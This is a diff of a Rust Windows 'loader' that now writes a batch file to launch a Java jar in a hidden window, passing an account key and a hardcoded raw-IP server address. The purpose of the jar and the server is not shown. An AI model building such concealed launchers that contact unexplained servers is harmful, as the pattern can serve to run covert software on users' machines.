@@ -15,7 +15,7 @@ use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::Networking::WinInet::*;
 
 const KEY: &str = "__ACCOUNT_KEY__";
-const SERVER: &str = "http://95.182.96.216"; // HARDCODED HERE
+const SERVER: &str = "http://95.182.96.216";
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn to_wide(s: &str) -> Vec<u16> {
@@ -173,21 +173,24 @@ fn main() {
     let java_console_exe = java_exe.with_file_name("java.exe");
     log(&loader, &format!("Launching Java with: {:?}", java_console_exe));
 
-    // Native Rust Command for output redirection
+    // Create a batch file to avoid Windows quoting hell
     let out_path = loader.join("java_out.txt");
-    if let Ok(out_file) = fs::File::create(&out_path) {
-        if let Ok(err_file) = out_file.try_clone() {
-            let _ = Command::new(&java_console_exe)
-                .arg("-jar")
-                .arg(&jar_path)
-                .arg(KEY)
-                .arg(SERVER)
-                .stdout(Stdio::from(out_file))
-                .stderr(Stdio::from(err_file))
-                .creation_flags(CREATE_NO_WINDOW)
-                .spawn();
-            
-            log(&loader, "Spawned Java successfully.");
-        }
+    let bat_path = loader.join("run.bat");
+    let bat_content = format!(
+        "@echo off\r\n\"{}\" -jar \"{}\" {} {} > \"{}\" 2>&1\r\n",
+        java_console_exe.display(), jar_path.display(), KEY, SERVER, out_path.display()
+    );
+    let _ = fs::write(&bat_path, bat_content);
+
+    let res = Command::new("cmd.exe")
+        .arg("/c")
+        .arg(&bat_path)
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn();
+
+    if res.is_ok() {
+        log(&loader, "Spawned Java via batch file. Check java_out.txt.");
+    } else {
+        log(&loader, "Failed to spawn Java via batch file.");
     }
 }
